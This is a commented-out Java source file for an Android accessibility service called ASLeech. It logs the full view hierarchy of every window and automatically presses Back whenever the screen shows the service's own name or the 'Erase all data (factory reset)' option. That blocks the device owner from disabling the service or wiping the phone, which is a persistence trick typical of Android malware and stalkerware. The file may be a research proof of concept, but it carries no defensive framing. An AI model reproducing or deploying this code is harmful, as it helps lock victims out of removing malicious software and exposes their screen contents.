//package com.noobexon.asleech;
//
//import android.accessibilityservice.AccessibilityService;
//import android.util.Log;
//import android.view.accessibility.AccessibilityEvent;
//import android.view.accessibility.AccessibilityNodeInfo;
//
//public class ASLeechJava extends AccessibilityService {
//
//    private static final String TAG = "ASLeech";
//
//    @Override
//    public void onAccessibilityEvent(AccessibilityEvent event) {
//        if (event == null) return;
//
//        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
//            AccessibilityNodeInfo root = getRootInActiveWindow();
//            if (root != null) {
//                logViewHierarchy(root, 0);
//                findAndPerformAction(root);
//            }
//        }
//    }
//
//    @Override
//    public void onInterrupt() {
//        Log.d(TAG, "Service interrupted");
//    }
//
//    private boolean findAndPerformAction(AccessibilityNodeInfo nodeInfo) {
//        if (nodeInfo == null) return false;
//
//        CharSequence text = nodeInfo.getText();
//        if (text != null) {
//            String textStr = text.toString();
//            if (textStr.equals("ASLeech") || textStr.equals("Erase all data (factory reset)")) {
//                performGlobalAction(GLOBAL_ACTION_BACK);
//                return true;
//            }
//        }
//
//        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
//            AccessibilityNodeInfo child = nodeInfo.getChild(i);
//            if (child != null && findAndPerformAction(child)) {
//                return true;
//            }
//        }
//        return false;
//    }
//
//    private void logViewHierarchy(AccessibilityNodeInfo nodeInfo, int depth) {
//        if (nodeInfo == null) return;
//
//        StringBuilder prefix = new StringBuilder();
//        for (int i = 0; i < depth; i++) {
//            prefix.append("  ");
//        }
//
//        Log.d(TAG, prefix.toString() + nodeInfo.toString());
//
//        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
//            AccessibilityNodeInfo child = nodeInfo.getChild(i);
//            if (child != null) {
//                logViewHierarchy(child, depth + 1);
//            }
//        }
//    }
//}